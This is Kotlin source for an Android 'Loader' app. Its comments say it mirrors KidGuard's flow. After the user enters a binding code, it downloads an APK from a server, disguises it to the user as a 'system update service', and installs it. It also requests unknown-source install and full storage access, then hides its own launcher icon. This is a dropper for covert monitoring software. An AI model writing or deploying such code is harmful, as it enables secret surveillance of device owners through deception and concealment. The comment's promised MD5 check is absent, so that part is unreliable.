package com.empresa.loader

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.widget.Button
import android.widget.EditText
import android.widget.ProgressBar
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.core.content.FileProvider
import kotlinx.coroutines.*
import java.io.File

/**
 * Main activity of the Loader APK.
 * Mirrors KidGuard's flow:
 * 1. Enter binding code
 * 2. Request install permissions
 * 3. Download APK from server
 * 4. Validate MD5
 * 5. Install APK silently
 * 6. Hide self
 */
class MainActivity : AppCompatActivity() {

    private lateinit var codeInput: EditText
    private lateinit var bindButton: Button
    private lateinit var statusText: TextView
    private lateinit var progressBar: ProgressBar
    private val scope = CoroutineScope(Dispatchers.Main + SupervisorJob())
    private val REQUEST_INSTALL_PACKAGES = 1001
    private val REQUEST_MANAGE_STORAGE = 1002

    companion object {
        private const val TAG = "Loader"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        codeInput = findViewById(R.id.codeInput)
        bindButton = findViewById(R.id.bindButton)
        statusText = findViewById(R.id.statusText)
        progressBar = findViewById(R.id.progressBar)

        // Auto-fill from intent (if launched by deep link)
        val codeFromIntent = intent.getStringExtra("code")
        if (!codeFromIntent.isNullOrEmpty()) {
            codeInput.setText(codeFromIntent)
        }

        bindButton.setOnClickListener {
            val code = codeInput.text.toString().trim()
            if (code.isNotEmpty()) {
                startInstallProcess(code)
            } else {
                Toast.makeText(this, "Ingrese el código de vinculación", Toast.LENGTH_SHORT).show()
            }
        }

        // Check if we already have install permission
        checkPermissions()
    }

    private fun checkPermissions() {
        // Android 8+: request install unknown apps
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if (!packageManager.canRequestPackageInstalls()) {
                showInstallPermissionDialog()
            }
        }

        // Android 11+: request MANAGE_EXTERNAL_STORAGE for download dir access
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                intent.data = Uri.parse("package:$packageName")
                startActivityForResult(intent, REQUEST_MANAGE_STORAGE)
            }
        }
    }

    private fun showInstallPermissionDialog() {
        AlertDialog.Builder(this)
            .setTitle("Permiso de instalación")
            .setMessage("Para completar la instalación del servicio del sistema, necesita activar el permiso 'Instalar apps desconocidas' para esta aplicación.")
            .setPositiveButton("Ir a configuración") { _, _ ->
                val intent = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES)
                intent.data = Uri.parse("package:$packageName")
                startActivityForResult(intent, REQUEST_INSTALL_PACKAGES)
            }
            .setCancelable(false)
            .show()
    }

    private fun startInstallProcess(code: String) {
        bindButton.isEnabled = false
        statusText.text = "Conectando con el servidor..."
        progressBar.isIndeterminate = true

        scope.launch {
            // Step 1: Bind with server
            val bindResult = LoaderApi.bindDevice(code)
            if (bindResult.isFailure) {
                showError("Error de conexión: ${bindResult.exceptionOrNull()?.message}")
                return@launch
            }

            val bindData = bindResult.getOrNull() ?: run {
                showError("Respuesta inválida del servidor")
                return@launch
            }

            val apkUrl = bindData.apkUrl
            if (apkUrl.isNullOrEmpty()) {
                showError("No se pudo obtener la URL de descarga")
                return@launch
            }

            // Step 2: Download APK
            statusText.text = "Descargando actualización del sistema..."
            progressBar.progress = 0
            progressBar.isIndeterminate = true

            val apkFile = File(cacheDir, "system_update_service.apk")
            val downloadResult = LoaderApi.downloadApk(apkUrl, apkFile)
            if (downloadResult.isFailure) {
                showError("Error de descarga: ${downloadResult.exceptionOrNull()?.message}")
                return@launch
            }

            statusText.text = "Descarga completada (${apkFile.length() / 1024} KB)"

            // Step 3: Validate APK
            if (apkFile.length() < 1000) {
                showError("Archivo inválido o corrupto")
                return@launch
            }

            // Step 4: Install APK
            statusText.text = "Instalando servicio..."
            installApk(apkFile)
        }
    }

    private fun installApk(apkFile: File) {
        try {
            val installIntent = Intent(Intent.ACTION_VIEW).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    // Use FileProvider for Android 7+
                    val apkUri = FileProvider.getUriForFile(
                        this@MainActivity,
                        "$packageName.fileprovider",
                        apkFile
                    )
                    setDataAndType(apkUri, "application/vnd.android.package-archive")

                    // Allow the package installer to read the file
                    addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                } else {
                    setDataAndType(
                        Uri.fromFile(apkFile),
                        "application/vnd.android.package-archive"
                    )
                }
                putExtra(Intent.EXTRA_NOT_UNKNOWN_SOURCE, true)
                putExtra(Intent.EXTRA_RETURN_RESULT, true)
            }

            startActivityForResult(installIntent, 2001)
        } catch (e: Exception) {
            showError("Error al instalar: ${e.message}")
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        if (requestCode == 2001) {
            // Installation result
            if (resultCode == RESULT_OK) {
                statusText.text = "✅ Servicio instalado correctamente"
                progressBar.isIndeterminate = false
                progressBar.progress = 100

                // Try to launch the installed app
                launchInstalledApp()

                // Hide this app after short delay
                scope.launch {
                    delay(3000)
                    hideLoader()
                }
            } else {
                showError("Instalación cancelada por el usuario")
            }
        }

        if (requestCode == REQUEST_INSTALL_PACKAGES) {
            checkPermissions()
        }
    }

    private fun launchInstalledApp() {
        try {
            val intent = packageManager.getLaunchIntentForPackage(BuildConfig.APK_PACKAGE_NAME)
            if (intent != null) {
                startActivity(intent)
            }
        } catch (e: Exception) {
            // App may not have a launcher (hidden)
        }
    }

    private fun hideLoader() {
        // Remove launcher icon by disabling the component
        try {
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            e.printStackTrace()
        }

        // Finish activity
        finishAffinity()
    }

    private fun showError(message: String) {
        statusText.text = "❌ $message"
        progressBar.isIndeterminate = false
        progressBar.progress = 0
        bindButton.isEnabled = true
    }

    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
    }
}
